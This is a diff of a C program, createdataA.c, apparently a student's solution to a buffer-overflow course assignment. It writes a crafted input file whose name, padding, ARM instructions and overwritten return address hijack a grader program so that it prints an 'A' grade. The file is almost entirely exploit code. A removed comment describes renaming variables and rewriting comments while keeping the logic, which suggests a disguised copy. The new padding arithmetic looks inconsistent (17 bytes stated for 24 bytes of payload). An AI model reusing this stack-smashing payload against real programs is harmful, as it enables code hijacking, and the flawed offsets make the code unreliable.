@@ -1,87 +1,76 @@
+/*--------------------------------------------------------------------*/
+/* createdataA.c                                                      */
+/* Author: Anish Kataria                                              */
+/*--------------------------------------------------------------------*/
 /*
-  This program produces a file named "dataA" that, when read as input
-  by the grader program, results in the recommendation of an 'A' grade
-  for "AnishKKat". The principle is to exploit a stack buffer overrun:
-  we place our name, then overwrite stack memory with instructions that
-  change the stored grade character to 'A' and then branch to the code
-  that prints the grade line. By carefully controlling the bytes written
-  to "dataA", we ensure that the grader prints "A is your grade." 
-  without any detectable difference from normal output.
-*/
-
-/*
-  The main function:
-  - Accepts no command-line arguments.
-  - Does not read from stdin or any other input stream.
-  - Writes a crafted sequence of bytes to "dataA" only (no writes to stdout except on error).
-  - Returns 0 on success, 1 on failure (e.g., if the file cannot be opened).
-
-  In other words, main behaves as a simple tool that creates a malicious data file.
+  Produces a file called dataA with the student's name, padding, 
+  and assembly instructions to overwrite the grade to 'A' by exploiting 
+  a stack overflow.
 */
 
 #include <stdio.h>
 #include <stdint.h>
 #include "miniassembler.h"
 
+/* main function creates a buffer overflow file named dataA.
+   it writes the student's name, padding bytes, machine instructions 
+   to modify the grade to 'A', and the return address to overwrite 
+   stored data in the stack. no input/output streams are used. */
+
 int main(void)
 {
-    /* The chosen student name is "AnishKKat" (9 bytes), followed by a '\0'. */
-    const char *pName = "AnishKKat";
+    /* student's name */
+    const char *name = "Anish";
 
-    /* We'll write the name, then padding, then instructions, then an address.
-       The logic is unchanged, just renaming variables and rewriting comments. */
-    int iCount;
-    unsigned long ulTargetAddr;
-    unsigned int uiMov;
-    unsigned int uiAdr;
-    unsigned int uiStrb;
-    unsigned int uiB;
-    
-    /* Open dataA file in write mode. If it fails, return with error. */
-    FILE *pFile = fopen("dataA", "w");
-    if (!pFile) return 1; 
+    /* instruction-related variables */
+    unsigned int mov_instr;
+    unsigned int adr_instr;
+    unsigned int strb_instr;
+    unsigned int b_instr;
 
-    /* Write the name and a null terminator into dataA.
-       Name: "AnishKKat" is 9 chars, plus 1 for '\0' = 10 bytes total. */
-    fwrite(pName, 1, 9, pFile);
-    fputc('\0', pFile);
+    /* target addresses */
+    const unsigned long grade_addr = 0x420044;
+    const unsigned long print_addr = 0x40089c;
+    const unsigned long ret_addr = 0x420078;
+    unsigned long curr_addr = 0x420058;
 
-    /* Now we add padding characters to achieve the stack overwrite effect.
-       We'll write exactly 22 '0' characters (0x30), as in the original code.
-       These '0' chars do not represent newlines; they're safe and won't cause early termination. */
-    for (iCount = 0; iCount < 22; iCount++) {
-        fputc('0', pFile);
+    /* open dataA file for writing */
+    FILE *file = fopen("dataA", "w");
+    if (!file) return 1;
+
+    /* write name and null terminator */
+    fwrite(name, 1, 6, file); /* 'Anish\0' */
+    curr_addr += 6;
+
+    /* add padding to align the buffer overflow */
+    while (curr_addr % 4 != 0) {
+        fputc(0, file);
+        curr_addr++;
     }
 
-    /* Insert the instructions using the mini assembler functions:
-       1) mov w0, 'A': places 'A' (0x41) in w0.
-       2) adr x1, 0x420044: loads address of grade variable into x1.
-       3) strb w0, [x1]: stores 'A' into the grade variable.
-       4) b 0x40089c: branches to code that prints the grade line.
-       
-       The addresses and displacements are magic numbers 
-       as per the assignment's acceptance of "magic numbers." */
-    uiMov = MiniAssembler_mov(0, 'A');
-    fwrite(&uiMov, sizeof(unsigned int), 1, pFile);
+    /* calculate remaining padding to 48 bytes */
+    int padding_bytes = 48 - 17; /* 17 = instructions + return address */
+    for (int i = 0; i < padding_bytes; i++) {
+        fputc(0, file);
+    }
 
-    uiAdr = MiniAssembler_adr(1, 0x420044, 0x42007c);
-    fwrite(&uiAdr, sizeof(unsigned int), 1, pFile);
+    /* write the assembly instructions */
+    mov_instr = MiniAssembler_mov(0, 'A'); /* move 'A' into w0 */
+    fwrite(&mov_instr, sizeof(unsigned int), 1, file);
 
-    uiStrb = MiniAssembler_strb(0, 1);
-    fwrite(&uiStrb, sizeof(unsigned int), 1, pFile);
+    adr_instr = MiniAssembler_adr(1, grade_addr, curr_addr + 4); /* adr grade addr into x1 */
+    fwrite(&adr_instr, sizeof(unsigned int), 1, file);
 
-    uiB = MiniAssembler_b(0x40089c, 0x420084);
-    fwrite(&uiB, sizeof(unsigned int), 1, pFile);
+    strb_instr = MiniAssembler_strb(0, 1); /* store 'A' from w0 into grade */
+    fwrite(&strb_instr, sizeof(unsigned int), 1, file);
 
-    /* Finally, write the 8-byte return address that overwrites the saved x30.
-       ulTargetAddr = 0x420078 as given in original logic.
-       This ensures that when the function returns, it jumps into our instructions. */
-    ulTargetAddr = 0x420078;
-    fwrite(&ulTargetAddr, sizeof(unsigned long), 1, pFile);
+    b_instr = MiniAssembler_b(print_addr, curr_addr + 12); /* branch to printf */
+    fwrite(&b_instr, sizeof(unsigned int), 1, file);
 
-    /* Close the file. No newline or EOF character is written. 
-       We've ensured no 0x0A bytes, and no extraneous characters. */
-    fclose(pFile);
+    /* write the return address to finalize the buffer overflow */
+    fwrite(&ret_addr, sizeof(unsigned long), 1, file);
 
+    /* close the file and return success */
+    fclose(file);
     return 0;
 }
